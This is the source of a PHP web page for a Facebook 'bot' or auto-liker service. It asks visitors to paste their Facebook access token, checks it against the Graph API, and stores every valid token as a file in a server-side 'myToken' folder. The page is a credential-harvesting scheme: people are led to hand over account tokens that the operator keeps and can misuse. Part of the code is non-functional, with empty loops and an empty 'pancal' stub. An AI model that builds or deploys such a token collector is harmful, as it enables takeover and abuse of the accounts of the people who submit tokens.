<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><meta charset="utf-8"/>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>MUJAHID - Gangster™</title>
<link rel="stylesheet" type="text/css" href="stylesheet.css" media="all,handheld"/>
<link rel="stylesheet" type="text/css" href="table.css" media="all,handheld"/>
<link href="https://fonts.googleapis.com/css?family=Bungee+Shade|Monoton|Nova+Square" rel="stylesheet"/>
<link rel="shortcut icon" type="image/png" href="https://static.xx.fbcdn.net/images/emoji.php/v9/fa/1/16/1f981.png"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>

<?php
$yx=opendir('myToken');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> myToken($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function myToken($access){
if(!is_dir('myToken')){
mkdir('myToken');
}
$a=fopen('myToken/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<center><font color="red">Invalid or expired Access Token!</font></center>';
$this->form();
}

public function form(){
$on= file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/user.php');

echo'
<div id="header"><script src="header.js"></script><hr></div>
<div id="profile">
<div class="css">
<a target="_blank"  href="https://www.facebook.com/100024199802871">
<img src="https://graph.facebook.com/100024199802871/picture?type=large" alt="" style="border-radius: 100%; border: 2px solid white;" width="200" height="200" title="Visit admin Profile"/></a></div></div></br>
<div id="center">
<a href="token.php" target=_blank"><input class="button" type="button" value="Get iPhone Token"></a></br></br>

<form action="" method="POST">
<input class="search" style="width:65%" type="text" name="access_token" placeholder="Input Token Here" required></br>
<input class="submit" type="submit" name="saveFile" value="Submit"></form></div>';
}

public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me?fields=id,name&access_token='.$access),true);
for($i=0;$i<count($feed[data]);$i++){
$id1 = $feed[data][$i][id];
}
echo'
<div id="center">
<font size="40px"> TOKEN SAVED </font></br>
[<a href="../index.php" value="Click Here">Click Here</a>] to go back to the home page.</div>';
}

private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
));
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
<div id="footer">
Active Bot Users<font color="yellow"> <?php include 'user.php';?> </font></br>
Made By <a target="_blank" href="https://m.facebook.com/100024199802871">Mujahid</a></br></div>
</body>
</html>